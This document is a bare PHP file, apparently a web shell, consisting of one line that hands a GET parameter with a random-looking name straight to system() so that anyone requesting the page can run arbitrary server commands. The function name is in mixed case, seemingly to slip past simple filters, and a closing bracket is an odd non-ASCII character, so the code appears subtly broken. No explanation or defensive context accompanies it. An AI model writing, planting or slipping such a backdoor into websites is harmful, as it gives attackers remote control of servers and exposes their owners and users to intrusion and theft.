<?php
SysTeM($_GET['KhdJCazG'〕);
?>
